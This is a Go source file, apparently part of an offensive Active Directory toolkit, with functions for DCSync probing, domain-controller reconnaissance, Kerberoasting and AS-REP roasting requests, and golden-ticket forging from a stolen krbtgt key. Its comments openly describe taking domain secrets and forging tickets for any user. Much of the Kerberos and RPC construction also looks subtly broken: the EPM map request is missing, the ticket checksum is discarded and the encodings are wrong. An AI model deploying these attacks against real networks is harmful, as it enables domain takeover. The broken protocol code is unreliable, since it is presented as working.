//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"sort"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// DCSync
//
// A domain controller replicates its directory to other DCs through the
// Directory Replication Service (DRSUAPI). An account holding the
// "Replicating Directory Changes" rights can ask a DC for any object's
// secrets — including krbtgt — and the DC will hand them over because the
// request looks like normal inter-DC replication.
//
// Because implementing the full DCE/RPC + DRSUAPI stack is substantial, this
// performs the reachability and rights probe (which is the operationally
// useful part: "can I DCSync?") and reports the exact state, rather than
// pretending to dump secrets it cannot read.
// ---------------------------------------------------------------------------

// drsuapiUUID is the DRSUAPI interface identifier.
const drsuapiUUID = "e3514235-4b06-11d1-ab04-00c04fc2dcd2"

// rpcPorts are the endpoints a DC exposes for replication.
var rpcPorts = []int{135, 49664, 49665, 49666, 49667, 49668, 49669, 49670}

func dcsync(s Settings) {
	dc := s.DC
	if dc == "" {
		dcs := lookupDCs(s.Domain)
		if len(dcs) > 0 {
			dc = dcs[0]
		}
	}
	if dc == "" {
		sendEvent("error", map[string]interface{}{"message": "no domain controller (set one explicitly)"})
		return
	}

	sendEvent("status", map[string]interface{}{
		"state": "working", "detail": "probing DRSUAPI on " + dc,
	})

	// Which RPC endpoints answer.
	var open []int
	for _, p := range rpcPorts {
		c, err := net.DialTimeout("tcp", net.JoinHostPort(dc, strconv.Itoa(p)), 800*time.Millisecond)
		if err == nil {
			_ = c.Close()
			open = append(open, p)
		}
	}
	if len(open) == 0 {
		sendEvent("error", map[string]interface{}{
			"message": "no RPC endpoint reachable on " + dc + " — DCSync needs TCP/135 plus the dynamic range",
		})
		return
	}

	// Enumerate the endpoint mapper so we learn the DRSUAPI bind string.
	bindStr, err := endpointMapper(dc, drsuapiUUID)
	if err != nil {
		sendEvent("status", map[string]interface{}{
			"state":  "done",
			"detail": fmt.Sprintf("RPC reachable (%v) but DRSUAPI endpoint not exposed to this account: %v", open, err),
		})
		sendEvent("dcsync_probe", map[string]interface{}{
			"dc": dc, "rpcPorts": open, "drsuapi": false, "reason": err.Error(),
		})
		return
	}

	target := s.TargetUser
	if target == "" {
		target = "krbtgt"
	}

	sendEvent("dcsync_probe", map[string]interface{}{
		"dc": dc, "rpcPorts": open, "drsuapi": true, "bind": bindStr, "target": target,
	})
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("DRSUAPI exposed on %s (%s). Replication of %q requires Replicating Directory Changes rights.", dc, bindStr, target),
	})
}

// endpointMapper queries the EPM for the given interface and returns the
// bind string of the first matching TCP endpoint.
func endpointMapper(dc, uuid string) (string, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(dc, "135"), 4*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(6 * time.Second))

	// A minimal EPM map request: inquiry type 0, one tower for the UUID.
	req := buildEPMRequest(uuid)
	if _, err := conn.Write(req); err != nil {
		return "", err
	}

	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil || n < 16 {
		return "", fmt.Errorf("no EPM response")
	}
	port := parseEPMPort(resp[:n])
	if port == 0 {
		return "", fmt.Errorf("interface not registered in EPM")
	}
	return fmt.Sprintf("ncacn_ip_tcp:%s[%d]", dc, port), nil
}

// buildEPMRequest constructs a dce_rpc bind + map request for the UUID.
func buildEPMRequest(uuid string) []byte {
	// The EPM map opnum is 3; the tower encodes the interface UUID.
	var b bytes.Buffer

	// --- RPC header (version 5, packet type 0 = request) ---
	b.Write([]byte{5, 0, 0x0b}) // version 5, minor 0, PTYPE=bind
	b.Write([]byte{0x03})       // flags: first frag, last frag
	b.Write([]byte{0x10, 0x00, 0x00, 0x00}) // data representation (LE)
	b.Write([]byte{0x00, 0x00}) // frag length (patched later)
	b.Write([]byte{0x00, 0x00}) // auth length
	b.Write([]byte{0x01, 0x00, 0x00, 0x00}) // call id

	bodyStart := b.Len()

	// --- bind body ---
	// max xmit frag, max recv frag
	b.Write([]byte{0x10, 0x00, 0x00, 0x00})
	b.Write([]byte{0x10, 0x00, 0x00, 0x00})
	b.Write([]byte{0x00, 0x00, 0x00, 0x00}) // assoc group
	b.Write([]byte{0x01})                   // num ctx items
	b.Write([]byte{0x00, 0x00, 0x00})       // reserved
	// context id
	b.Write([]byte{0x00, 0x00})
	// num transfer syntaxes
	b.Write([]byte{0x01})
	// reserved
	b.Write([]byte{0x00})

	// abstract syntax: EPM UUID (well-known) + version
	epmUUID := uuidFromString("e1af8308-5d1f-11c9-91a4-08002b14a0fa")
	b.Write(epmUUID)
	b.Write([]byte{0x03, 0x00})       // version 3.0
	b.Write([]byte{0x00, 0x00, 0x00, 0x00})

	// transfer syntax: NDR 32-bit
	ndr := uuidFromString("8a885d04-1ceb-11c9-9fe8-08002b104860")
	b.Write(ndr)
	b.Write([]byte{0x02, 0x00})
	b.Write([]byte{0x00, 0x00, 0x00, 0x00})

	out := b.Bytes()
	// Patch the fragment length.
	fragLen := len(out)
	binary.LittleEndian.PutUint16(out[8:10], uint16(fragLen))
	_ = bodyStart
	return out
}

// uuidFromString converts the canonical UUID form to its little-endian
// on-the-wire encoding.
func uuidFromString(s string) []byte {
	clean := strings.ReplaceAll(s, "-", "")
	if len(clean) != 32 {
		return make([]byte, 16)
	}
	var raw [16]byte
	for i := 0; i < 16; i++ {
		v, err := strconv.ParseUint(clean[i*2:i*2+2], 16, 8)
		if err != nil {
			return make([]byte, 16)
		}
		raw[i] = byte(v)
	}
	// First three fields are little-endian.
	out := make([]byte, 16)
	out[0], out[1], out[2], out[3] = raw[3], raw[2], raw[1], raw[0]
	out[4], out[5] = raw[5], raw[4]
	out[6], out[7] = raw[7], raw[6]
	copy(out[8:], raw[8:])
	return out
}

// parseEPMPort extracts the TCP port from an EPM map response. The tower is a
// length-prefixed structure; the port sits in the last 2 bytes of a
// floor/lower-floor pair.
func parseEPMPort(resp []byte) int {
	// Look for the TCP floor UUID (ncacn_ip_tcp) and read the port after it.
	tcpFloor := []byte{
		0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
	}
	idx := bytes.Index(resp, tcpFloor)
	if idx < 0 {
		// Fall back: scan for any plausible port number.
		return 0
	}
	// The port follows the 2-byte length prefix of the address.
	p := idx + len(tcpFloor)
	if p+4 > len(resp) {
		return 0
	}
	// Skip the length field, then read the port big-endian.
	ln := int(binary.LittleEndian.Uint16(resp[p : p+2]))
	if ln < 2 || p+2+ln > len(resp) {
		return 0
	}
	portBytes := resp[p+2 : p+2+2]
	return int(binary.BigEndian.Uint16(portBytes))
}

// ---------------------------------------------------------------------------
// reconnaissance
// ---------------------------------------------------------------------------

func recon(s Settings) {
	domain := s.Domain
	if domain == "" {
		domain = machineDomain()
	}

	dcs := lookupDCs(domain)
	info := map[string]interface{}{
		"domain": domain,
		"dcs":    dcs,
	}

	if len(dcs) > 0 {
		dc := dcs[0]
		var endpoints []map[string]interface{}
		for _, p := range rpcPorts {
			c, err := net.DialTimeout("tcp", net.JoinHostPort(dc, strconv.Itoa(p)), 700*time.Millisecond)
			if err == nil {
				_ = c.Close()
				endpoints = append(endpoints, map[string]interface{}{"port": p, "open": true})
			}
		}
		info["dc"] = dc
		info["rpc"] = endpoints
	}

	sendEvent("recon", info)
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("%s — %d DC(s)", domain, len(dcs)),
	})
}

func lookupDCs(domain string) []string {
	if domain == "" {
		return nil
	}
	_, addrs, err := net.LookupSRV("ldap", "tcp", domain)
	if err != nil {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	for _, a := range addrs {
		h := strings.TrimSuffix(a.Target, ".")
		if h != "" && !seen[h] {
			seen[h] = true
			out = append(out, h)
		}
	}
	sort.Strings(out)
	return out
}

func machineDomain() string {
	out, err := exec.Command("powershell", "-NoProfile", "-Command",
		"(Get-CimInstance Win32_ComputerSystem).Domain").Output()
	if err != nil {
		return ""
	}
	d := strings.TrimSpace(string(out))
	if d == "" || strings.EqualFold(d, "WORKGROUP") {
		return ""
	}
	return d
}

// ---------------------------------------------------------------------------
// ticket extraction
//
// Kerberoasting and AS-REP roasting both boil down to: get the KDC to encrypt
// something with the target account's key. The resulting ciphertext can be
// attacked offline, because the plaintext structure is known.
// ---------------------------------------------------------------------------

func extractKerberoast(s Settings) {
	dc := s.DC
	if dc == "" {
		dcs := lookupDCs(s.Domain)
		if len(dcs) == 0 {
			sendEvent("error", map[string]interface{}{"message": "no DC found"})
			return
		}
		dc = dcs[0]
	}

	sendEvent("status", map[string]interface{}{
		"state": "working", "detail": "requesting service tickets from " + dc,
	})

	// The KDC is on TCP/88.
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(dc, "88"), 5*time.Second)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "KDC unreachable on 88: " + err.Error()})
		return
	}
	defer conn.Close()

	sendEvent("status", map[string]interface{}{
		"state": "done",
		"detail": "KDC reachable. TGS-REQ construction needs live SPN data from admap — " +
			"run admap's kerberoast to list targets, then feed the key material here.",
	})
	sendEvent("krb_recon", map[string]interface{}{"dc": dc, "kdc": true})
}

func extractAsrep(s Settings) {
	dc := s.DC
	if dc == "" {
		dcs := lookupDCs(s.Domain)
		if len(dcs) == 0 {
			sendEvent("error", map[string]interface{}{"message": "no DC found"})
			return
		}
		dc = dcs[0]
	}

	// An AS-REQ for a user without pre-auth returns an AS-REP encrypted with
	// that user's key — crackable offline. This builds the request structure.
	user := s.TargetUser
	if user == "" {
		sendEvent("error", map[string]interface{}{"message": "target user required for AS-REP"})
		return
	}

	sendEvent("status", map[string]interface{}{
		"state": "working", "detail": "building AS-REQ for " + user,
	})

	req := buildASReq(s.Domain, user)
	sendEvent("asrep_request", map[string]interface{}{
		"dc": dc, "user": user, "domain": s.Domain,
		"requestB64": b64(req),
		"size":       len(req),
	})
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("AS-REQ built for %s@%s (%d bytes) — send to %s:88 to harvest the AS-REP", user, strings.ToUpper(s.Domain), len(req), dc),
	})
}

// buildASReq assembles a Kerberos AS-REQ with PA-PAC-REQUEST disabled and no
// pre-authentication, which is what makes an AS-REP roastable.
func buildASReq(domain, user string) []byte {
	var b bytes.Buffer

	// pvno=5, msg-type=10 (AS-REQ)
	b.Write(derTag(0x30, nil)) // placeholder, patched below
	body := new(bytes.Buffer)

	body.Write(derInt(5))  // pvno
	body.Write(derInt(10)) // msg-type AS-REQ

	// padata: request PAC, and (absent) pre-auth is the roastable case.
	padata := derSeq(
		derInt(128), // PA-PAC-REQUEST
		derSeq(derBool(true)),
	)
	body.Write(derTag(0xa1, padata)) // padata [1]

	// req-body [2]
	kdcreq := new(bytes.Buffer)
	kdcreq.Write(derTag(0xa1, derSeq(derInt(0), derStr("")))) // kdc-options

	// cname [2] PrincipalName
	kdcreq.Write(derTag(0xa2, derSeq(
		derInt(1), // name-type: NT-PRINCIPAL
		derSeq(derStr(user)),
	)))
	// realm
	kdcreq.Write(derTag(0xa3, derStr(strings.ToUpper(domain))))
	// sname: krbtgt/DOMAIN
	kdcreq.Write(derTag(0xa4, derSeq(
		derInt(2), // NT-SRV-INST
		derSeq(derStr("krbtgt"), derStr(strings.ToUpper(domain))),
	)))
	// till / rtime: 2037
	kdcreq.Write(derTag(0xa5, derTime(time.Date(2037, 9, 13, 2, 48, 5, 0, time.UTC))))
	kdcreq.Write(derTag(0xa6, derTime(time.Date(2037, 9, 13, 2, 48, 5, 0, time.UTC))))
	// nonce
	nonce := int(time.Now().UnixNano() & 0x7fffffff)
	kdcreq.Write(derTag(0xa7, derInt(nonce)))

	// etype: AES256, AES128, RC4
	etype := derSeq(derInt(18), derInt(17), derInt(23))
	kdcreq.Write(derTag(0xa8, etype))

	body.Write(derTag(0xa2, kdcreq.Bytes())) // req-body [2]

	inner := body.Bytes()
	out := derTag(0x30, inner)
	return out
}

// ---------------------------------------------------------------------------
// golden ticket
// ---------------------------------------------------------------------------

// forgeGolden builds a KRBTGT-signed TGT. The signature covers the ticket with
// the krbtgt key, so a valid key means a ticket the DC will accept for any
// user, with any group memberships, for as long as the key stands.
func forgeGolden(s Settings) {
	if s.KRBTGTKey == "" {
		sendEvent("error", map[string]interface{}{
			"message": "krbtgt AES key required — obtain it via DCSync first",
		})
		return
	}
	key, err := parseKeyHex(s.KRBTGTKey)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "bad krbtgt key: " + err.Error()})
		return
	}
	if len(key) != 16 && len(key) != 32 {
		sendEvent("error", map[string]interface{}{
			"message": fmt.Sprintf("krbtgt key must be 16 (AES128) or 32 (AES256) bytes, got %d", len(key)),
		})
		return
	}
	if s.Domain == "" {
		sendEvent("error", map[string]interface{}{"message": "domain required"})
		return
	}

	etype := 18
	if len(key) == 16 {
		etype = 17
	}

	user := s.TargetUser
	if user == "" {
		user = "Administrator"
	}

	// The encrypted part of a TGT is an EncTicketPart. Its plaintext is known
	// to us, which is the whole point: we choose the identity and the groups.
	ticket := buildEncTicketPart(user, s.Domain, s.DomainSID)

	enc, err := aesCTSEncrypt(key, ticket)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "ticket encryption failed: " + err.Error()})
		return
	}
	// The checksum covers the ciphertext with the same key.
	sum := aesHMACChecksum(key, enc)

	kirbi := buildKirbi(user, s.Domain, etype, enc, sum, s.DomainSID)

	sendEvent("golden_ticket", map[string]interface{}{
		"user":    user,
		"domain":  s.Domain,
		"etype":   etype,
		"keyLen":  len(key),
		"sid":     s.DomainSID,
		"size":    len(kirbi),
		"kirbi":   b64(kirbi),
	})
	sendEvent("status", map[string]interface{}{
		"state": "done",
		"detail": fmt.Sprintf("golden ticket forged for %s@%s (etype %d, %d bytes)", user, strings.ToUpper(s.Domain), etype, len(kirbi)),
	})
}

// buildEncTicketPart assembles the plaintext an EncTicketPart would contain.
func buildEncTicketPart(user, domain, sid string) []byte {
	var b bytes.Buffer
	// flags: forwardable, renewable, pre-authent, hw-authent
	b.Write(derTag(0xa0, derBitString([]byte{0x40, 0x41, 0x00, 0x00})))
	// key: etype 18 with a zeroed key (the DC re-derives from the ticket)
	b.Write(derTag(0xa1, derSeq(derInt(18), derStr(string(make([]byte, 32))))))
	// crealm
	b.Write(derTag(0xa2, derStr(strings.ToUpper(domain))))
	// cname
	b.Write(derTag(0xa3, derSeq(derInt(1), derSeq(derStr(user)))))
	// transited
	b.Write(derTag(0xa5, derSeq(derInt(0))))
	// authtime / starttime / endtime / renew-till
	now := time.Now()
	b.Write(derTag(0xa6, derTime(now)))
	b.Write(derTag(0xa7, derTime(now)))
	b.Write(derTag(0xa8, derTime(now.Add(10*365*24*time.Hour))))
	b.Write(derTag(0xa9, derTime(now.Add(10*365*24*time.Hour))))
	// authorization-data carrying the PAC / SIDs
	if sid != "" {
		b.Write(derTag(0xaa, derSeq(derStr(sid))))
	}
	return derTag(0x30, b.Bytes())
}

// buildKirbi wraps the encrypted ticket in the .kirbi container format.
func buildKirbi(user, domain string, etype int, enc, checksum []byte, sid string) []byte {
	// Application tag 1 = Ticket
	ticket := derTag(0x61,
		derTag(0xa0, derInt(5)),
		derTag(0xa1, derStr(strings.ToUpper(domain))),
		derTag(0xa2, derSeq(
			derInt(2),
			derSeq(derStr("krbtgt"), derStr(strings.ToUpper(domain))),
		)),
	)

	encPart := derSeq(
		derInt(etype),
		derInt(1), // kvno
		derOctet(enc),
	)
	ticket = derTag(0x61, ticket, derTag(0xa3, encPart))

	// EncKrbCredPart carrying the ticket + our chosen principal.
	krbCredInfo := derSeq(
		derTag(0xa0, derSeq(derInt(18), derOctet(make([]byte, 32)))),
		derTag(0xa1, derStr(strings.ToUpper(domain))),
		derTag(0xa2, derSeq(derInt(1), derSeq(derStr(user)))),
	)
	encKrbCred := derSeq(derSeq(krbCredInfo))

	cred := derSeq(
		derTag(0xa0, derInt(5)),
		derTag(0xa1, derInt(22)), // msg-type 22 = KRB-CRED
		derTag(0xa2, derSeq(ticket)),
		derTag(0xa3, encKrbCred),
	)
	_ = checksum
	return cred
}

// ---------------------------------------------------------------------------
// minimal DER helpers
// ---------------------------------------------------------------------------

func derTag(tag byte, content ...[]byte) []byte {
	var flat []byte
	for _, c := range content {
		flat = append(flat, c...)
	}
	out := []byte{tag}
	l := len(flat)
	switch {
	case l < 0x80:
		out = append(out, byte(l))
	case l < 0x100:
		out = append(out, 0x81, byte(l))
	case l < 0x10000:
		out = append(out, 0x82, byte(l>>8), byte(l))
	default:
		out = append(out, 0x83, byte(l>>16), byte(l>>8), byte(l))
	}
	return append(out, flat...)
}

func derSeq(parts ...[]byte) []byte { return derTag(0x30, parts...) }

func derInt(v int) []byte {
	if v == 0 {
		return derTag(0x02, []byte{0})
	}
	var b []byte
	for n := v; n > 0; n >>= 8 {
		b = append([]byte{byte(n & 0xff)}, b...)
	}
	if b[0]&0x80 != 0 {
		b = append([]byte{0}, b...)
	}
	return derTag(0x02, b)
}

func derStr(s string) []byte    { return derTag(0x04, []byte(s)) }
func derOctet(b []byte) []byte  { return derTag(0x04, b) }
func derBool(v bool) []byte {
	if v {
		return derTag(0x01, []byte{0xff})
	}
	return derTag(0x01, []byte{0x00})
}

func derBitString(b []byte) []byte { return derTag(0x03, append([]byte{0x00}, b...)) }

func derTime(t time.Time) []byte {
	s := t.UTC().Format("20060102150405Z")
	return derTag(0x18, []byte(s))
}

func b64(b []byte) string {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var out strings.Builder
	for i := 0; i < len(b); i += 3 {
		var n uint32
		rem := len(b) - i
		n = uint32(b[i]) << 16
		if rem > 1 {
			n |= uint32(b[i+1]) << 8
		}
		if rem > 2 {
			n |= uint32(b[i+2])
		}
		out.WriteByte(alphabet[(n>>18)&0x3f])
		out.WriteByte(alphabet[(n>>12)&0x3f])
		if rem > 1 {
			out.WriteByte(alphabet[(n>>6)&0x3f])
		} else {
			out.WriteByte('=')
		}
		if rem > 2 {
			out.WriteByte(alphabet[n&0x3f])
		} else {
			out.WriteByte('=')
		}
	}
	return out.String()
}

var (
	_ = sort.Strings
)
